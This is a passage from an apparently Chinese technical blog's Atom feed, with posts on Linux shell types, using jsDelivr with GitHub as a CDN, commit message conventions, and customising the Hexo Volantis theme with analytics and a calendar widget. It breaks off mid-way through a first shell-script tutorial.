    <link href="https://www.0x2beace.com/shell-types-in-linux/"/>
    <id>https://www.0x2beace.com/shell-types-in-linux/</id>
    <published>2020-07-11T12:36:46.000Z</published>
    <updated>2020-07-11T12:41:49.331Z</updated>
    
    <content type="html"><![CDATA[<p>什么是Shell？</p><a id="more"></a><p>Shell 是一个程序，其作用是将用户输入的命令发送到OS（系统内核）。</p><p>据说它起源于作为存在于OS 内部和用户之间的外壳的依附着。所以为形象的称作为 壳（Shell）。</p><h2 id="Shell-的种类"><a href="#Shell-的种类" class="headerlink" title="Shell 的种类"></a>Shell 的种类</h2><p>Linux Shell 的种类很多，目前流行的Shell 包括ash、bash、ksh、csh、zsh等，种类多了，也就有了标准化的要求，这就是POSIX的由来。</p><p>POSIX 表示可移植操作系统接口（UNIX的可移植操作系统接口，缩写为POSIX），POSIX标准定义了操作系统应该为应用程序提供的接口标准。</p><p>通过以下命令来查看文件中的内容来查看自己主机中当前有哪些种类的Shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;shells</span><br><span class="line">&#x2F;bin&#x2F;sh</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br><span class="line">&#x2F;bin&#x2F;ksh</span><br><span class="line">&#x2F;bin&#x2F;pdksh</span><br><span class="line">&#x2F;bin&#x2F;tcsh</span><br><span class="line">&#x2F;bin&#x2F;zsh</span><br><span class="line">&#x2F;bin&#x2F;dash</span><br><span class="line">&#x2F;bin&#x2F;posh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;bash</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;ksh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pdksh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;tcsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;zsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;dash</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;posh</span><br></pre></td></tr></table></figure><p>如何查看当前正在使用的Shell 类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo $SHELL</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><code>$SHELL</code>是一个环境变量，它记录了Linux 当前用户所使用的Shell类型。</p><p>用户可以通过直接输入各种Shell的二进制文件名（因为这些二进制文件本身是可以被执行的），来进入到该Shell下，比如进入<code>zsh</code>可以直接输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ &#x2F;bin&#x2F;zsh</span><br></pre></td></tr></table></figure><p>这个命令为用户又启动了一个Shell，这个Shell在最初登录的那个Shell之后，称为下级的Shell或子Shell。</p><h2 id="最标准的Shell"><a href="#最标准的Shell" class="headerlink" title="最标准的Shell"></a>最标准的Shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p><code>sh</code>是Unix 上最古老的Shell，在<code>sh</code>的基础上添加了各种扩展功能的是<code>bash</code>，它成为Linux标准Shell。有如下的特点：</p><ul><li>使用上下键快速查看历史命令</li><li>Tab 键自动补全</li></ul><h2 id="其他Shell"><a href="#其他Shell" class="headerlink" title="其他Shell"></a>其他Shell</h2><h3 id="ash"><a href="#ash" class="headerlink" title="ash"></a>ash</h3><p><code>ash</code>是Linux 中占用系统资源最少的一个小Shell，它只包含24个内部命令，因而使用起来很不方便。</p><h3 id="csh"><a href="#csh" class="headerlink" title="csh"></a>csh</h3><p><code>csh</code>是Linux 比较大的内核，共有52个内部命令。该Shell其实是指向/bin/tcsh这样的一个Shell，也就是说，csh其实就是tcsh。</p><h3 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h3><p>zch是Linux 最大的Shell之一，共有84 个内部命令。 zsh具有如下特性：</p><ul><li>更好的自动补全、更高效</li><li>更好的文件名展开（通配符展开）</li><li>可定制性高</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://academy.gmocloud.com/keywords/20170324/4010" target="_blank" rel="noopener">什么是Shell以及常见Shell种类</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;什么是Shell？&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>免费 CDN：JsDelivr + Github</title>
    <link href="https://www.0x2beace.com/free-cdn-jsdelivr-github/"/>
    <id>https://www.0x2beace.com/free-cdn-jsdelivr-github/</id>
    <published>2020-07-10T05:32:43.000Z</published>
    <updated>2020-07-10T05:34:57.891Z</updated>
    
    <content type="html"><![CDATA[<p>不知道大家通常是如何访问图床的，我之前一直使用的方式是：<code>GitHub</code> 图床 + <code>raw.githubusercontent</code>。</p><p>图片相关的资源全部放在<code>GitHub</code>上，然后使用GitHub 提供的素材服务器<code>raw.githubusercontent</code>去访问。但是这种方式存在一个问题，那就是放在 Github 的资源在国内加载速度比较慢，如果网络稍微差一些，资源可能就会加载失败。</p><p>因此需要使用 CDN 来加速来优化资源加载速度。</p><a id="more"></a><h2 id="CDN-是什么"><a href="#CDN-是什么" class="headerlink" title="CDN 是什么"></a>CDN 是什么</h2><blockquote><p>CDN的全称是<code>Content Delivery Network</code>，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p></blockquote><p>由于某些原因，很多公用免费的 CDN 资源在中国大陆并不很好用，就算是付费的，也有一定的限制，例如每天的刷新次数有限之类的。<br>幸运的是在中国大陆唯一有 license 的公有 CDN竟然是免费的，它就是——<a href="https://www.jsdelivr.com/" target="_blank" rel="noopener">JsDelivr</a>。</p><h2 id="JsDelivr-是什么"><a href="#JsDelivr-是什么" class="headerlink" title="JsDelivr 是什么"></a>JsDelivr 是什么</h2><blockquote><p>A free CDN for Open Source fast, reliable, and automated. —— JsDelivr 官网</p></blockquote><p>根据官网的介绍我们可以知道它是一个<strong>免费</strong>、<strong>快速</strong>、<strong>可靠</strong>、<strong>自动化</strong> 的CDN。</p><p>那么，这么棒的CDN，到底该如何使用呢？下面会一一介绍。</p><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>JsDelivr 目前有三种用法：</p><ul><li>Npm</li><li>Github</li><li>Wordpress</li></ul><p>因为本文的重点是如何使用 GitHub + JsDelivr，来搭建免费的CDN，所以这里就不对其他两种用法做过多介绍。</p><h3 id="1-新建Github-仓库"><a href="#1-新建Github-仓库" class="headerlink" title="1. 新建Github 仓库"></a>1. 新建Github 仓库</h3><p>这个仓库是用于存储资源文件的，最好是public，因为private的仓库，资源链接会带token验证，而这个token会存在过期的问题。</p><h3 id="2-将本地资源推送至仓库"><a href="#2-将本地资源推送至仓库" class="headerlink" title="2. 将本地资源推送至仓库"></a>2. 将本地资源推送至仓库</h3><p>将资源文件加入本地仓库，然后推送至 CDN 的远程仓库。</p><h3 id="3-发布仓库"><a href="#3-发布仓库" class="headerlink" title="3. 发布仓库"></a>3. 发布仓库</h3><p>如果没有发布就直接使用，可能会导致文件加载异常。</p><p>自定义发布版本号：<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200710132805.png" alt=""></p><p>然后点击<code>Publish release</code>。</p><h3 id="4-通过jsDeliver引用资源"><a href="#4-通过jsDeliver引用资源" class="headerlink" title="4. 通过jsDeliver引用资源"></a>4. 通过jsDeliver引用资源</h3><p>只需要通过符合 JSDelivr 规则的 URL 引用，即可直接使用 Github 中的资源。</p><p>规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;username&#x2F;repository@version&#x2F;file</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>cdn.jsdelivr.net/gh/</code>：jsDeliver 规定Github 的引用地址</li><li><code>username</code>：你的GitHub 用户名</li><li><code>repository</code>：CDN 仓库</li><li><code>@version</code>：发布的版本号</li><li><code>file</code>：资源文件在仓库中的路径</li></ul><p>版本号不是必需的，是为了区分新旧资源，如果不使用版本号，将会直接引用最新资源，除此之外还可以使用某个范围内的版本，查看所有资源等，具体使用方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 通过指定版本号引用</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN&#x2F;blog&#x2F;images&#x2F;avatar.jpg</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 使用一个范围内的版本</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 忽略版本号则默认使用最新版</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在任意JS&#x2F;CSS文件后添加 .min 能得到一个缩小版</span><br><span class="line">&#x2F;&#x2F; 如果它本身不存在，我们将会为你生成</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;src&#x2F;core.min.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在末尾加 &#x2F; 则得到目录列表</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;</span><br></pre></td></tr></table></figure><p>同样的一张图片，可以对比一下<code>jsDeliver</code>和<code>raw.githubusercontent</code> 的访问速度。</p><ul><li><code>jsDeliver</code>：<a href="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg</a></li><li><code>raw.githubusercontent</code>：<a href="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg" target="_blank" rel="noopener">https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;不知道大家通常是如何访问图床的，我之前一直使用的方式是：&lt;code&gt;GitHub&lt;/code&gt; 图床 + &lt;code&gt;raw.githubusercontent&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;图片相关的资源全部放在&lt;code&gt;GitHub&lt;/code&gt;上，然后使用GitHub 提供的素材服务器&lt;code&gt;raw.githubusercontent&lt;/code&gt;去访问。但是这种方式存在一个问题，那就是放在 Github 的资源在国内加载速度比较慢，如果网络稍微差一些，资源可能就会加载失败。&lt;/p&gt;
&lt;p&gt;因此需要使用 CDN 来加速来优化资源加载速度。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    <category term="GitHub" scheme="https://www.0x2beace.com/categories/Tutorial/GitHub/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
  </entry>
  
  <entry>
    <title>如何写好Commit log</title>
    <link href="https://www.0x2beace.com/how-to-write-a-commit-log/"/>
    <id>https://www.0x2beace.com/how-to-write-a-commit-log/</id>
    <published>2020-07-10T01:22:51.000Z</published>
    <updated>2021-06-16T13:37:17.307Z</updated>
    
    <content type="html"><![CDATA[<p>其实关于这个问题，老早都想整理了，只是一直没有腾出空来，最近刚好有空，索性整理了下。</p><p>这里就不过多介绍什么是<code>Git</code>了，本文的重点是<code>Commit Log</code>，如果还不清楚<code>Git</code>是什么，可以看一下我的<code>Git</code>系列的其他笔记。</p><h2 id="为什么要关注提交信息"><a href="#为什么要关注提交信息" class="headerlink" title="为什么要关注提交信息"></a>为什么要关注提交信息</h2><ol><li>加快<code>Reviewing Code</code>的过程</li><li>提醒自己或他人，某个提交具体增加了什么功能，改动了哪些地方</li><li>提高项目的整体质量</li></ol><h2 id="Angular-规范的-Commit-message-格式"><a href="#Angular-规范的-Commit-message-格式" class="headerlink" title="Angular 规范的 Commit message 格式"></a>Angular 规范的 Commit message 格式</h2><p>这种格式（规范）是我目前觉得相对其他格式（规范）而言，最容易接受、上手的一种。</p><p>其核心是每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;</span><br><span class="line">&#x2F;&#x2F; 空一行</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&#x2F;&#x2F; 空一行</span><br><span class="line">&lt;footer&gt;</span><br></pre></td></tr></table></figure><p>其中，Header 是必需的，Body 和 Footer 可以省略。</p><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>Header 部分只有一行，包括三个字段：<strong>type</strong>（必需）、<strong>scope</strong>（可选）和 <strong>subject</strong>（必需）。</p><p><strong>type</strong> 用于说明 <code>commit</code> 的类别，只允许使用下面 7 个标识。</p><ul><li><strong>feat</strong> 新功能（feature）</li><li><strong>fix</strong> 修补 bug</li><li><strong>docs</strong> 文档（documentation）</li><li><strong>style</strong> 格式（不影响代码运行的变动）</li><li><strong>refactor</strong> 重构（即不是新增功能，也不是修改 bug 的代码变动）</li><li><strong>test</strong> 增加测试</li><li><strong>chore</strong> 构建过程、辅助工具的变动</li><li><strong>perf</strong> 提高性能</li><li><strong>typo</strong> 打字错误</li></ul><p><strong>scope</strong> 用于说明 <code>commit</code> 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同。</p><p><strong>subject</strong> 是 <code>commit</code> 目的的简短描述，不超过 50 个字符。</p><h3 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h3><p>Body 部分是对本次 commit 的详细描述，可以分成多行。</p><h3 id="Footer"><a href="#Footer" class="headerlink" title="Footer"></a>Footer</h3><p>Footer 部分只用于不兼容变动和关闭 Issue。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本来我自己一直使用的方式就是：<code>git commit -am &quot;fix login bug&quot;</code>，虽然并没有绝对的对错，但这显然不是最好的方式。</p><p>这种东西并没有强制性的规定，只要团队之间约定好，然后按照这个约定协作就好了。</p><p>所以我觉得在团队之间<code>commit</code>时，可以不用完全按照<code>Angular 规范的Commit message</code>格式去提交，可以按照以下约定来执行。</p><ul><li><code>commit</code>时，只用保留 Header 部分就好。</li><li><code>pull request</code>时，才需要 Header、Body、Footer 这三部分。</li></ul><p>另外<code>commit</code>时需要注意以下几点：</p><ul><li>创建短小而明确的<code>commit</code>，一句话说清楚。</li><li>一个小改动对应一次<code>commit</code>，不建议一大堆改动，一次<code>commit</code>。</li><li>如果添加的代码会使项目发生极大的变化，那么需要及时更新<code>remade</code>文件以向他人说明此次更改。</li></ul><h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docs: add FAQ in readme file</span><br><span class="line">feat: increase user login function</span><br><span class="line">fix: fix user login bug</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://ruby-china.org/topics/15737" target="_blank" rel="noopener">Git 如何写好 Commit Log？</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实关于这个问题，老早都想整理了，只是一直没有腾出空来，最近刚好有空，索性整理了下。&lt;/p&gt;
&lt;p&gt;这里就不过多介绍什么是&lt;code&gt;Git&lt;/code&gt;了，本文的重点是&lt;code&gt;Commit Log&lt;/code&gt;，如果还不清楚&lt;code&gt;Git&lt;/code&gt;是什么，可以</summary>
      
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Hexo Volantis 主题优化 | 增加分析与统计</title>
    <link href="https://www.0x2beace.com/hexo-volantis-theme-optimization-add-analysis-and-statistics/"/>
    <id>https://www.0x2beace.com/hexo-volantis-theme-optimization-add-analysis-and-statistics/</id>
    <published>2020-07-09T13:14:37.000Z</published>
    <updated>2020-07-09T13:19:08.344Z</updated>
    
    <content type="html"><![CDATA[<p>Volantis 默认支持 <a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子</a> 的访问统计，可以自行添加<a href="https://tongji.baidu.com/" target="_blank" rel="noopener">百度统计</a>和 <a href="https://analytics.google.com/" target="_blank" rel="noopener">Google Analytics</a>。</p><a id="more"></a><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ul><li>Hexo：4.2</li><li>Node：12</li><li>Volantis：2.6</li></ul><h2 id="分析与统计"><a href="#分析与统计" class="headerlink" title="分析与统计"></a>分析与统计</h2><h3 id="字数和阅读时长"><a href="#字数和阅读时长" class="headerlink" title="字数和阅读时长"></a>字数和阅读时长</h3><ol><li>Volantis 默认没有安装 <code>wordcount</code>插件，所以需要手动安装：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save hexo-wordcount</span><br></pre></td></tr></table></figure><ol start="2"><li>修改主题配置文件<code>themes/volantis/_config.yml</code>，将 wordcount 插件打开</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">plugins:</span><br><span class="line">  ...</span><br><span class="line">  # 文章字数统计、阅读时长，开启需要安装插件: npm i --save hexo-wordcount</span><br><span class="line">  wordcount: true</span><br></pre></td></tr></table></figure><ol start="3"><li>继续修改主题配置文件<code>themes/volantis/_config.yml</code>，将 <code>wordcount</code> 放在需要显示的 meta 位置：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 布局</span><br><span class="line">layout:</span><br><span class="line">  on_list:</span><br><span class="line">    meta: [..., wordcount, ...]</span><br><span class="line">  on_page:</span><br><span class="line">    meta:</span><br><span class="line">      header: [..., wordcount, ...]</span><br><span class="line">      footer: [..., wordcount, ...]</span><br></pre></td></tr></table></figure><h3 id="百度统计"><a href="#百度统计" class="headerlink" title="百度统计"></a>百度统计</h3><p>百度统计是百度推出的一款免费的专业网站流量分析工具，能够告诉用户访客是如何找到并浏览用户的网站，在网站上做了些什么，非常有趣，接下来我们把百度统计添加到自己博客当中。</p><ol><li>访问<a href="https://tongji.baidu.com/" target="_blank" rel="noopener">百度统计首页</a>，注册一个账号后登陆，添加你的博客网站。</li></ol><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200709204712.png" alt=""></p><ol start="2"><li><p>点击获取代码，复制该代码。</p></li><li><p>在主题配置文件中，增加以下内容：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnzz: true</span><br></pre></td></tr></table></figure><p>用于设置是否开启百度统计。</p><ol start="4"><li>在<code>themes/volantis/layout/_partial</code>目录下，新建一个<code>cnzz.ejs</code>文件，将刚才复制的内容粘贴进去：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (theme.cnzz)&#123; %&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var _hmt &#x3D; _hmt || [];</span><br><span class="line">    (function () &#123;</span><br><span class="line">        var hm &#x3D; document.createElement(&quot;script&quot;);</span><br><span class="line">        hm.src &#x3D; &quot;https:&#x2F;&#x2F;hm.baidu.com&#x2F;hm.js?xxxxxxxxxxxxxxxxxxxxxxx&quot;;</span><br><span class="line">        var s &#x3D; document.getElementsByTagName(&quot;script&quot;)[0];</span><br><span class="line">        s.parentNode.insertBefore(hm, s);</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>最后将以下内容放在网站首页的尾部<code>themes/volantis/layout/_partial/footer.ejs</code>中：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- partial(&#39;cnzz&#39;) %&gt;</span><br></pre></td></tr></table></figure><p>完成以上所有操作之后，可以在<a href="https://tongji.baidu.com/sc-web/10000236600/home/site/index" target="_blank" rel="noopener">百度统计管理页面</a>检查代码是否安装正确，如果正确安装，通常二十分钟之后就可以看到网站的分析数据了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Volantis 默认支持 &lt;a href=&quot;http://busuanzi.ibruce.info/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;不蒜子&lt;/a&gt; 的访问统计，可以自行添加&lt;a href=&quot;https://tongji.baidu.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;百度统计&lt;/a&gt;和 &lt;a href=&quot;https://analytics.google.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Google Analytics&lt;/a&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Hexo" scheme="https://www.0x2beace.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hexo Volantis 主题优化 | 添加日历图</title>
    <link href="https://www.0x2beace.com/hexo-volantis-theme-optimization-add-calendar/"/>
    <id>https://www.0x2beace.com/hexo-volantis-theme-optimization-add-calendar/</id>
    <published>2020-07-09T13:07:08.000Z</published>
    <updated>2021-06-19T13:13:58.891Z</updated>
    
    <content type="html"><![CDATA[<p>一直觉得GitHub 日历图（代码提交统计样式）很好看，偶然发现是可以通过配置将日历模块引入到Hexo 的主题中的。</p><p>默认效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200709204832.png" alt=""></p><p>因为我使用的Hexo 主题是<code>Volantis</code>、而该主题目前并没有集成该控件，所以需要手动配置。</p><a id="more"></a><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ul><li>Hexo：4.2</li><li>Node：12</li><li>Volantis：2.6</li></ul><p>Volantis 低版本可能会不适用于本文介绍的方法，可以参考 <code>YINUXY</code> 的 <a href="https://cloud.tencent.com/developer/article/1597223" target="_blank" rel="noopener">Hexo主题美化 | 给你的博客加上GITHUB日历云和分类</a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ol><li><p>在主题配置文件 <code>themes\volantis\_config.yml</code> 下添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postCalendar: true</span><br></pre></td></tr></table></figure><p>用于设置在归档页面中是否显示’文章日历’控件，如果不想显示，设置为 <code>false</code> 即可。</p></li><li><p>在归档页面 <code>themes/volantis/layout/archive.ejs</code> 添加以下代码：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;calendar&quot;&gt;</span><br><span class="line">&lt;% if (theme.postCalendar) &#123; %&gt;</span><br><span class="line">&lt;%- partial(&#39;_widget&#x2F;post-calendar&#39;) %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>具体添加位置：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200709205348.png" alt="IMAGE"></p><p>这里会根据主题配置文件中的<code>postCalendar</code>的值，来判断是否需要渲染。</p><ol start="3"><li>点击下载日历样式文件 <a href="https://github.com/0xAiKang/CDN/blob/master/blog/js/post-calendar.ejs" target="_blank" rel="noopener">post-calendar.ejs</a>，放置于<code>themes/volantis/layout/_widget</code>目录下。</li></ol><p>将其中的第 16 行，替换成以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN@1.0&#x2F;blog&#x2F;js&#x2F;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>至此已经完成了，使用<code>hexo generate &amp;&amp; hexo server</code>查看是否可以正常加载日历图。</p><p>默认的样式是高仿<code>gittee</code>，如果觉得不满意，可以参考<a href="https://echarts.apache.org/zh/option.html#calendar" target="_blank" rel="noopener">官方文档</a>自定义。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/cungudafa/article/details/106420842" target="_blank" rel="noopener">hexo（sakura）仿gitee添加文章贡献度日历图（echarts）</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;一直觉得GitHub 日历图（代码提交统计样式）很好看，偶然发现是可以通过配置将日历模块引入到Hexo 的主题中的。&lt;/p&gt;
&lt;p&gt;默认效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200709204832.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;因为我使用的Hexo 主题是&lt;code&gt;Volantis&lt;/code&gt;、而该主题目前并没有集成该控件，所以需要手动配置。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Hexo" scheme="https://www.0x2beace.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>编写第一个Shell 脚本</title>
    <link href="https://www.0x2beace.com/write-the-first-shell-script/"/>
    <id>https://www.0x2beace.com/write-the-first-shell-script/</id>
    <published>2020-07-08T13:56:46.000Z</published>
    <updated>2020-07-08T13:59:47.029Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来记录编写 Shell 脚本过程中的一些基础知识。</p><a id="more"></a><h2 id="什么是-shell-脚本"><a href="#什么是-shell-脚本" class="headerlink" title="什么是 shell 脚本"></a>什么是 shell 脚本</h2><blockquote><p><code>Shell</code> 脚本就是将一堆的 <code>Shell</code> 命令以及指定执行 <code>Shell</code> ，通过放在一个文件中来执行。</p></blockquote><h2 id="创建第一个shell-脚本"><a href="#创建第一个shell-脚本" class="headerlink" title="创建第一个shell 脚本"></a>创建第一个shell 脚本</h2><p>下面我们来创建第一个 shell 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ vim showdate</span><br><span class="line"></span><br><span class="line">#! &#x2F;bin&#x2F;bash</span><br><span class="line"># this script displays the date and who&#39;s logged on</span><br><span class="line">date</span><br><span 